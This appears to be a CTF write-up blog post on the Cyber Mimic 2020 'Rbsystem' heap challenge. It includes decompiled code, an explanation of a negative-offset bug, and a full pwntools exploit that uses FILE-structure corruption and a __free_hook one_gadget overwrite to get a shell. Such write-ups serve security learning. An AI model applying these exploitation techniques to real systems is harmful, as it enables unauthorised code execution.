@@ -1,0 +1,163 @@
+<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
+         Cyber Mimic 2020 Rbsystem Writeup
+        
+    </title><meta content="Cyber Mimic 2020 Rbsystem Writeup" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/rbsystem/&t=Cyber Mimic 2020 Rbsystem Writeup"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>Cyber Mimic 2020 Rbsystem Writeup<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-06-21</time></div></div><section class=body><p>This weekend , we have a great time playing Cyber Mimic CTF and this post is supposedly the intended solution for the challenge <strong>Rbsystem</strong> that we solved during the CTF.<h2 id=tl-dr-of-the-binary>TL;DR OF THE BINARY</h2><p>The binary is a standard <code>x86 64-bit</code> Dynamically linked binary. The given libc is <strong>2.27</strong>.<p>Here's what checksec has to say.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>CANARY    </span><span style=color:#bfbab0cc>: </span><span>ENABLED
+</span><span>FORTIFY   </span><span style=color:#bfbab0cc>: </span><span>disabled
+</span><span>NX        </span><span style=color:#bfbab0cc>: </span><span>ENABLED
+</span><span>PIE       </span><span style=color:#bfbab0cc>: </span><span>ENABLED
+</span><span>RELRO     </span><span style=color:#bfbab0cc>: </span><span>FULL
+</span></code></pre><p>Let's jump to Reversing it.<h2 id=reversing>REVERSING</h2><p>Firing up ghidra , We see that its a standard CTF-style menu driven binary which has the following options.<p>For the sake of understanding , I'll not be going in the actual order of appearance of these options in the binary. {: .notice}<ol><li><strong>Allocate</strong> - <ul><li>Asks for <em>unsigned long</em> index ,checks if it is less that <strong>0x10</strong> and also checks if the bss table corresponding to that index is empty or not.<li>It then requests <em>unsigned long</em> <strong>size</strong> ,checks if it is less that <strong>0x1001</strong> and then calls <strong>malloc</strong> with that size.<li>It then stores the malloc pointer to the bss table that corresponds to allocated chunks and the size to the corresponding bss table.</ul></ol><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#ff7733>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  ulong idx</span><span style=color:#bfbab0cc>;
+</span><span>  ulong __size</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>void </span><span style=color:#f29668>*</span><span>pvVar1</span><span style=color:#bfbab0cc>;
+</span><span>  
+</span><span>  </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Index: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  idx </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>((idx </span><span style=color:#f29668>< </span><span style=color:#f29718>0x10</span><span>) </span><span style=color:#f29668>&& </span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(</span><span style=color:#f29668>&</span><span>arr_alloc </span><span style=color:#f29668>+</span><span> idx </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>) </span><span style=color:#f29668>== </span><span style=color:#f29718>0</span><span>)) {
+</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Size: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    __size </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if </span><span>(__size </span><span style=color:#f29668>< </span><span style=color:#f29718>0x1001</span><span>) {
+</span><span>      pvVar1 </span><span style=color:#f29668>= </span><span style=color:#f07178>malloc</span><span>(__size)</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#ff7733>if </span><span>(pvVar1 </span><span style=color:#f29668>== </span><span>(</span><span style=color:#ff7733>void </span><span style=color:#f29668>*</span><span>)</span><span style=color:#f29718>0x0</span><span>) {
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"allocate failed"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      }
+</span><span>      </span><span style=color:#ff7733>else </span><span>{
+</span><span>        </span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>void </span><span style=color:#f29668>**</span><span>)(</span><span style=color:#f29668>&</span><span>arr_alloc </span><span style=color:#f29668>+</span><span> idx </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>) </span><span style=color:#f29668>=</span><span> pvVar1</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#f29668>*</span><span>(ulong </span><span style=color:#f29668>*</span><span>)(</span><span style=color:#f29668>&</span><span>arr_size </span><span style=color:#f29668>+</span><span> idx </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>) </span><span style=color:#f29668>=</span><span> __size</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Done!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      }
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span></code></pre><ol start=2><li><strong>Open</strong> - <ul><li>This option basically opens the file <strong>/dev/urandom</strong> and sets a flag to mark it open.</ul></ol><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>open</span><span>(</span><span style=color:#ff7733>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#ff7733>if </span><span>(open_bit </span><span style=color:#f29668>== </span><span style=color:#f29718>0</span><span>) {
+</span><span>    file_ptr </span><span style=color:#f29668>= </span><span style=color:#f07178>fopen</span><span>(</span><span style=color:#c2d94c>"/dev/urandom"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"rb"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if </span><span>(file_ptr </span><span style=color:#f29668>== </span><span>(FILE </span><span style=color:#f29668>*</span><span>)</span><span style=color:#f29718>0x0</span><span>) {
+</span><span>                    </span><span style=font-style:italic;color:#5c6773>/* WARNING: Subroutine does not return */
+</span><span>      </span><span style=color:#f07178>exit</span><span>(</span><span style=color:#f29668>-</span><span style=color:#f29718>1</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    open_bit </span><span style=color:#f29668>= </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Done!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span></code></pre><ol start=3><li><strong>Close</strong> - <ul><li>This option closes the file opened by <strong>Open</strong> function and clears the flag that was set previously.</ul></ol><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>close</span><span>(</span><span style=color:#ff7733>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#ff7733>if </span><span>(open_bit </span><span style=color:#f29668>!= </span><span style=color:#f29718>0</span><span>) {
+</span><span>    </span><span style=color:#f07178>fclose</span><span>(file_ptr)</span><span style=color:#bfbab0cc>;
+</span><span>    open_bit </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
+</span><span>    file_ptr </span><span style=color:#f29668>= </span><span>(FILE </span><span style=color:#f29668>*</span><span>)</span><span style=color:#f29718>0x0</span><span style=color:#bfbab0cc>;
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span></code></pre><ol start=4><li><strong>Edit</strong> - <ul><li>Initially checks for the flag that is set by the <strong>open</strong> function to check if the file <strong>/dev/urandom</strong> is open or not.<li>If the file is opened , it then goes about asking <em>unsigned long</em> <strong>Index</strong> , checks if index is less than 0x10 and checks whether an allocation exists in the bss table.<li>It then asks for a <em>long</em> <strong>offset</strong> and a <em>size_t</em> <strong>size</strong>.<li>Checks whether <strong>size + offset</strong> is less than or equal to actual size that was recorded in the sizes table of bss.<li>Finally it calls <strong>fread</strong> and reads <strong>size</strong> number of <strong>random bytes</strong> from <strong>/dev/urandom</strong> starting from the <strong>offset</strong> specified.</ul></ol><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>
+</span><span style=color:#ff7733>void </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#ff7733>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  ulong idx</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>long</span><span> offset</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=font-style:italic;color:#39bae6>size_t</span><span> __size</span><span style=color:#bfbab0cc>;
+</span><span>
+</span><span>  </span><span style=color:#ff7733>if </span><span>(open_bit </span><span style=color:#f29668>!= </span><span style=color:#f29718>0</span><span>) {
+</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Index: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    idx </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if </span><span>((idx </span><span style=color:#f29668>< </span><span style=color:#f29718>0x10</span><span>) </span><span style=color:#f29668>&& </span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(</span><span style=color:#f29668>&</span><span>arr_alloc </span><span style=color:#f29668>+</span><span> idx </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>) </span><span style=color:#f29668>!= </span><span style=color:#f29718>0</span><span>)) {
+</span><span>      </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Offset: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      offset </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Size: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      __size </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#ff7733>if </span><span>((</span><span style=color:#ff7733>long</span><span>)(__size </span><span style=color:#f29668>+</span><span> offset) </span><span style=color:#f29668><= *</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(</span><span style=color:#f29668>&</span><span>arr_size </span><span style=color:#f29668>+</span><span> idx </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>)) {
+</span><span>        </span><span style=color:#f07178>fread</span><span>((</span><span style=color:#ff7733>void </span><span style=color:#f29668>*</span><span>)(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(</span><span style=color:#f29668>&</span><span>arr_alloc </span><span style=color:#f29668>+</span><span> idx </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>) </span><span style=color:#f29668>+</span><span> offset)</span><span style=color:#bfbab0cc>,</span><span>__size</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span>file_ptr)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Done!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      }
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span></code></pre><p>Now that we have reversed the code , let's get our hands dirty with exploit.<h2 id=exploit-development>EXPLOIT DEVELOPMENT</h2><p>The bug was quite inevitable in the edit function where for offset calculation a <strong>long</strong> type integer was used. We could pass negetive integers as offset and write random bytes at almost arbitrary locations.<p>So at this point we were quite stuck , what is the use of writing out random bytes anywhere? Then after sometime, something weird but interesting popped up.<p>Well we can write random bytes anywhere ,<p>Why not try writing just one <strong>null</strong> byte at the <strong>File Descriptor field</strong> of the file structure stored on heap so that it reads from <strong>stdin</strong> instead of <strong>/dev/urandom</strong>? {: .notice}<p>Well this idea was great but it required a 1 byte brute force over the server [and our vm was deadslow :/].<p>Having no other option at our hands , we decided to go this way.<p>wait , what about leaks?<p>Thats a little trivial since we can close and re allocate our file structure on heap. Here's the idea.<ul><li>Call <strong>Open</strong> and allocate the file structure on heap.<li>Now call malloc to avoid top consolidation<li>Close the file structure.</ul><blockquote><p><strong>Remember</strong> that <strong>fclose</strong> calls <strong>free</strong> internally.</blockquote><ul><li>Now malloc as the same size of the file structure.<li>Well you have the old file structure with some libc pointers still lurking around which u can leak by adding random bytes till that location by calling <strong>edit</strong>.</ul><pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
+</span><span style=color:#ff7733>import </span><span>sys
+</span><span>
+</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
+</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(</span><span style=color:#c2d94c>'172.35.29.46'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>9999</span><span>)
+</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace</span><span style=color:#f29668>=</span><span style=color:#f29718>True
+</span><span style=color:#ff7733>else</span><span>:
+</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>'./rbsystem'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>env </span><span style=color:#f29668>= </span><span>{</span><span style=color:#c2d94c>"LD_PRELOAD" </span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"./libc.so.6"</span><span>})
+</span><span>
+</span><span>reu </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(a)
+</span><span>sla </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
+</span><span>sl </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(a)
+</span><span>rel </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvline</span><span>()
+</span><span>sa </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
+</span><span>re </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(a)
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>idx</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>size</span><span>):
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'choice: '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1'</span><span>)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'Index: '</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'Size: '</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(size))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>idx</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>off</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>size</span><span>):
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'choice: '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span>)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'Index: '</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'Offset: '</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(off))
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'Size: '</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(size))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>show</span><span>(</span><span style=color:#f29718>idx</span><span>):
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'choice: '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'3'</span><span>)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'Index: '</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>fopen</span><span>():
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'choice: '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'4'</span><span>)
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>fclose</span><span>():
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'choice: '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'5'</span><span>)
+</span><span>
+</span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
+</span><span>    </span><span style=color:#ffb454>fopen</span><span>()
+</span><span>    </span><span style=color:#ffb454>fclose</span><span>()
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>544</span><span>)
+</span><span>    </span><span style=color:#ffb454>fopen</span><span>()
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Fill with random bytes until Libc
+</span><span>    </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>104</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Get libc
+</span><span>    </span><span style=color:#ffb454>show</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>    </span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>113</span><span>)
+</span><span>    libc_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>6</span><span>)</span><span style=color:#f29668>+</span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>"</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x3ec680
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"Libc @ "</span><span style=color:#f29668>+</span><span style=font-style:italic;color:#39bae6>str</span><span>(</span><span style=color:#f07178>hex</span><span>(libc_base)))
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Well sometimes the exploit crashed due to some corrupted leak and hence I added this check
+</span><span>    </span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>hex</span><span>(libc_base)[</span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>:</span><span style=color:#f29718>4</span><span>]</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"7f"</span><span>):
+</span><span>        </span><span style=font-style:italic;color:#5c6773>#Add a chunk in such a way that file structure if above it in memory.
+</span><span>        </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>544</span><span>)
+</span><span>        </span><span style=font-style:italic;color:#5c6773>#Here goes our random byte at the offset of fd of the file structure.
+</span><span>        </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>-</span><span style=color:#f29718>4560</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>1</span><span>)
+</span><span>        </span><span style=font-style:italic;color:#5c6773>#add a buffer chunk of 0x1000 bytes and call edit on it to fill it with random bytes.
+</span><span>        </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x1000</span><span>)
+</span><span>        </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>3991</span><span>)
+</span></code></pre><p>The next edit should take input from stdin if the file descriptor has been nulled out by that random byte.<p>Now we can directly edit our file structure with our input.<p>Note that here we cant go for <strong>vtable</strong> overwrite as there would be checks in <strong>glibc 2.27</strong>. {: .notice}<p>Hence we decided to achieve arbitrary write by using <strong>IO_buf_base</strong> and <strong>IO_buf_end</strong>. If we overwrite <strong>IO_buf_base</strong> with malloc/free hook and <strong>IO_buf_end</strong> with somewhere after <strong>free/malloc hook</strong> , we can write one gadget to either of these pointers.<p>Initially we overwrote <strong>__malloc_hook</strong> to get shell but the constraints of <strong>one_gadget</strong> wouldn't satisfy hence we tried overwriting <strong>free_hook</strong> with system and overwrite file pointer <strong>magic number</strong> with <strong>/bin/sh</strong> to get shell in internals of <strong>fclose</strong> but the problem was that , on server the magic number was not overwritten with <strong>/bin/sh</strong> rather it executed <strong>system(magic_num)</strong> which didnt give us shell.<p>Finally overwriting <strong>free_hook</strong> with a suitable gadget only gave shell.<p>Here's the rest of the script<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>        </span><span style=font-style:italic;color:#5c6773>#Overwriting buf_base and buf_end with free_hook and region nearby
+</span><span>        buf_base </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x3ebc30
+</span><span>        buf_end </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x3ebd40
+</span><span>        gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
+</span><span>        </span><span style=font-style:italic;color:#5c6773>#Finally calling edit to take input at file structure from stdin
+</span><span>        </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>-</span><span style=color:#f29718>4616</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>16</span><span>)
+</span><span>        payload </span><span style=color:#f29668>= </span><span style=color:#ffb454>p64</span><span>(buf_base) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(buf_end)
+</span><span>        io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(payload)
+</span><span>        one_gadget </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x10a38c
+</span><span>        </span><span style=font-style:italic;color:#5c6773>#Now we write to free_hook
+</span><span>        </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>-</span><span style=color:#f29718>4688</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>8</span><span>)
+</span><span>        payload </span><span style=color:#f29668>= </span><span style=color:#ffb454>p64</span><span>(one_gadget)</span><span style=color:#f29668>+</span><span style=color:#c2d94c>"a"</span><span style=color:#f29668>*</span><span style=color:#f29718>8 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(one_gadget)
+</span><span>        io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(payload)
+</span><span>        gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
+</span><span>        </span><span style=color:#ffb454>fclose</span><span>()
+</span><span>    </span><span style=color:#ff7733>else</span><span>:
+</span><span>        log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>'Restart Exploit'</span><span>)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
+</span><span>
+</span></code></pre><h2 id=conclusion>CONCLUSION</h2><p>I really liked the idea of writing just one null byte using <strong>/dev/urandom</strong> and then brute forcing to get shell.<p>Enjoyed solving the challenge, credits to <a href=https://twitter.com/sherl0ck__>sherl0ck</a> for the idea.<p>Here's the <a href=https://gist.github.com/PwnVerse/79485fce497bb30e7eaf4e9b01a6a20c>script</a>.</section></article></main></div>
